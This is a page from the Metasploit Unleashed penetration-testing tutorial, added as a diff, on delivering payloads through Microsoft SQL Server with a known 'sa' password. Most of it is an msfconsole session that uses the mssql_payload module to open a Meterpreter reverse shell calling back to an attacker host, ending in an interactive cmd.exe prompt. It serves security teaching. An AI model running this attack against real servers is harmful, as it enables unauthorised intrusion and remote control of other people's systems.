@@ -1,0 +1,55 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Payloads Through MSSQL</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Payloads
+Through MSSQL</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">In the prior section you saw the basics
+of creating a module, I
+wanted to show you this module to get an understanding of what we're
+about to build. This module allows you to quickly deliver Metasploit
+based payloads through Microsoft SQL servers. The current code works
+with 2000, 2005, and 2008. These next few sections will first walk you
+through how to use this attack vector, and start you from scratch on
+rebuilding how I was able to write this payload (and after HDM cleaned
+up my code).
+</p>
+<p style="color: rgb(0, 0, 0);">Let's first take a look at how the
+exploit works. If you read
+through the Fast-Track section already, you would notice that something
+similar happens within Fast-Track as well. When an administrator first
+installs SQL Server 2000, 2005, or 2008, if they specify mixed
+authentication or SQL based authentication, they have to specify a
+password for the notorious "sa" account. The "sa" account is the
+systems administrator account for SQL based servers and has a ton of
+permissions on the system itself. If you can somehow guess the password
+of "sa", you can then leverage attack vectors through Metasploit to
+perform additional attacks. If you looked at some of the prior
+chapters, you saw how to discovery SQL servers through UDP port 1434 as
+well as perform dictionary-based brute force attacks against IP
+Addresses in order to guess the SQL "sa" account.
+</p>
+<p style="color: rgb(0, 0, 0);">From here on out, we will assume that
+you already know the
+password for the MSSQL server and that you are ready to deliver your
+payload to the underlying operating system and not use Fast-Track.
+</p>
+<p style="color: rgb(0, 0, 0);">Let's launch the attack:
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf &gt; use windows/mssql/mssql_payload<br>msf exploit(mssql_payload) &gt; set payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(mssql_payload) &gt; set LHOST 10.10.1.103<br>LHOST =&gt; 10.10.1.103<br>msf exploit(mssql_payload) &gt; set RHOST 172.16.153.129<br>RHOST =&gt; 172.16.153.129<br>msf exploit(mssql_payload) &gt; set LPORT 8080<br>LPORT =&gt; 8080<br>msf exploit(mssql_payload) &gt; set MSSQL_PASS ihazpassword<br>MSSQL_PASS =&gt; ihazpassword<br>msf exploit(mssql_payload) &gt; exploit<br><br>[*] Started reverse handler on port 8080<br>[*] Warning: This module will leave QiRYOlUK.exe in the SQL Server %TEMP% directory<br>[*] Writing the debug.com loader to the disk...<br>[*] Converting the debug script to an executable...<br>[*] Uploading the payload, please be patient...<br>[*] Converting the encoded payload...<br>[*] Executing the payload...<br>[*] Sending stage (719360 bytes)<br>[*] Meterpreter session 1 opened (10.10.1.103:8080 -&gt; 10.10.1.103:47384)<br><br><u>meterpreter</u> &gt; execute -f cmd.exe -i<br>Process 3740 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Building_A_Metasploit_Module"
+ title="Building A Metasploit Module">Building a Metasploit Module</a></div>
+<br style="color: rgb(0, 0, 0);">
+</body>
+</html>
